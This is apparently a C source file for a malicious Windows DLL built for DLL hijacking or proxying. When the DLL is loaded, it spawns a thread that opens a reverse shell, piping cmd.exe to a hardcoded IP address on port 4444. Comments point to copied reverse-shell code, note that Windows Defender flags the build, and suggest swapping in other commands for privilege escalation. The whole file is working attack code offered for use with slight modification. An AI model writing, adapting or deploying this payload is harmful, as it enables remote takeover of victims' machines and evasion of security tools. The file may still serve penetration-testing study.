#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Build: gcc dllproxypayload.c -shared -o payload.dll -lws2_32
// Test run (just compromise):
// Note: to build w/ a def file for proxying, would compile doing something like this: https://www.cobaltstrike.com/blog/create-a-proxy-dll-with-artifact-kit

// Goal here is to have a usable (w/ slight modification) dll for use w/ dll hijacking, proxying, etc
void Compromise (){ //Default function that is executed when the DLL is loaded
    system("echo 'dll compromise run' > compout.txt"); // Swap out w /your command to execute here (could do rev shell, privesc, etc this way)
    WinRevShell(4444, "192.168.194.211");
}

// Copying code from: https://github.com/izenynn/c-reverse-shell/blob/main/windows.c
// NOTE: Defender flags this when compiled, could try a different approach
void WinRevShell(int port, char* ip){
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
		write(2, "[ERROR] WSASturtup failed.\n", 27);
		return;
	}

	struct sockaddr_in sa;
	SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = inet_addr(ip);

	if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		write(2, "[ERROR] connect failed.\n", 24);
		return;
	}

	STARTUPINFO sinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = (STARTF_USESTDHANDLES);
	sinfo.hStdInput = (HANDLE)sockt;
	sinfo.hStdOutput = (HANDLE)sockt;
	sinfo.hStdError = (HANDLE)sockt;
	PROCESS_INFORMATION pinfo;
	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
}

// dll load entry point (may still need to proxy any function that caller is looking for specifically)
BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Compromise,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

